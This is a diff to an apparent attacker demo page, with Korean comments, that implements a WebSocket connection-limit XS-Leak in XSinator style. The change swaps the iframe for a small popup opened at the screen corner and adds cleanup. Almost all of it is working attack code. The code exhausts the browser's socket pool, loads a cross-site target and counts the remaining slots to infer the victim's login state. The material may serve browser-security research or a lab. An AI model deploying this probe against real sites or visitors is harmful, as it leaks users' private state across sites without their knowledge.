@@ -50,7 +50,7 @@
     <h1>Attacker 페이지: WebSocket API XS-Leak (단순 버전)</h1>
 
     <div class="panel">
-      <p>선택한 타깃 워크스페이스를 iframe으로 열고, WebSocket 슬롯 차이를 관찰합니다.</p>
+      <p>선택한 타깃 워크스페이스를 window.open으로 열고, WebSocket 슬롯 차이를 관찰합니다.</p>
       <p>payload는 XSinator 형태를 최대한 유지했습니다.</p>
     </div>
 
@@ -64,16 +64,12 @@
       <button id="clear">로그 지우기</button>
     </p>
 
-    <iframe
-      id="target-frame"
-      name="WW"
-      style="width: 100%; min-height: 220px; border: 1px solid #cbd5e1;"
-    ></iframe>
     <pre id="log" class="panel" style="white-space: pre-wrap; min-height: 220px;"></pre>
   </main>
 
   <script>
     let SOCKETS = [];
+    let targetWindow = null;
 
     const sleep = (ms) => {
       return new Promise((resolve) => setTimeout(resolve, ms));
@@ -118,45 +114,76 @@
     };
 
     const output = document.getElementById('log');
-    const targetFrame = document.getElementById('target-frame');
 
     function log(line) {
       output.textContent += '[' + new Date().toLocaleTimeString() + '] ' + line + '\n';
       output.scrollTop = output.scrollHeight;
     }
 
-    const leak = async (url, waitTime = 3000, max = 200) => {
+    function openTargetWindow() {
+      const width = 320;
+      const height = 320;
+      const left = Math.max(0, window.screen.availWidth - width - 24);
+      const top = Math.max(0, window.screen.availHeight - height - 48);
+      const features = [
+        'popup=yes',
+        'menubar=no',
+        'toolbar=no',
+        'location=no',
+        'status=no',
+        'resizable=no',
+        'scrollbars=no',
+        `width=${width}`,
+        `height=${height}`,
+        `left=${left}`,
+        `top=${top}`,
+      ].join(',');
+      targetWindow = window.open('about:blank', 'WW', features);
+      return targetWindow;
+    }
+
+    const leak = async (url, waitTimeMs = 3000, max = 200) => {
       const ws = `ws://${location.host}/attack-ws`; // attacker-controlled ws endpoint
 
-      log('ws endpoint: ' + ws);
-      log('[ ] Exhausting ws connections ...')
-      exaustWsLimit(ws, max);
-      await sleep(500);
+      try {
+        log('ws endpoint: ' + ws);
+        log('[ ] Exhausting ws connections ...')
+        exaustWsLimit(ws, max);
+        await sleep(500);
 
-      const pageWsLimit = SOCKETS.length;
-      log('[*] Measured current limit for ws connection count: ' + pageWsLimit);
+        const pageWsLimit = SOCKETS.length;
+        log('[*] Measured current limit for ws connection count: ' + pageWsLimit);
 
-      log('[ ] Making 10 empty rooms for new ws connection...')
-      killSockets(10);
-      await sleep(500);
+        log('[ ] Making 10 empty rooms for new ws connection...')
+        killSockets(10);
+        await sleep(500);
 
-      log(`[ ] Loading cross-site target with iframe... (wait: ${waitTime}ms)`)
-      window.WW.location = url;
-      await sleep(waitTime);
+        log(`[ ] Loading cross-site target with window.open... (wait: ${waitTimeMs}ms)`)
+        if (!targetWindow || targetWindow.closed) {
+          openTargetWindow();
+        }
+        if (!targetWindow) {
+          throw new Error('Failed to open target window');
+        }
+        targetWindow.location = url;
+        await sleep(waitTimeMs);
 
-      log('[ ] Exhausting ws connections...')
-      exaustWsLimit(ws, 10);
-      await sleep(400);
+        log('[ ] Exhausting ws connections...')
+        exaustWsLimit(ws, 10);
+        await sleep(400);
 
-      const res = pageWsLimit - SOCKETS.length;
-      log(`[*] Reached measured socket limit? -> ${res > 0 ? 'X' : 'O'} (limit=${pageWsLimit} filled=${SOCKETS.length})`)
-
-      log('[ ] Cleaning up...')
-      closeAllWs();
-      window.WW.location = 'about:blank';
-      await sleep(300);
-
-      return res;
+        const res = pageWsLimit - SOCKETS.length;
+        log(`[*] Reached measured socket limit? -> ${res > 0 ? 'X' : 'O'} (limit=${pageWsLimit} filled=${SOCKETS.length})`)
+        return res;
+      } finally {
+        log('[ ] Cleaning up...')
+        closeAllWs();
+        if (targetWindow && !targetWindow.closed) {
+          targetWindow.close();
+        }
+        targetWindow = null;
+        await sleep(300);
+      }
     };
 
     async function runLeak() {
@@ -164,7 +191,7 @@
       const url = baseUrl + '?ts=' + Date.now();
       log('target: ' + url);
 
-      const res = await leak(url);
+      const res = await leak(url, waitTimeMs=1000);
 
       if (res > 0) {
         log('probe=MISSING -> target 이 ws 사용 중으로 추정(로그인 추정)\n');
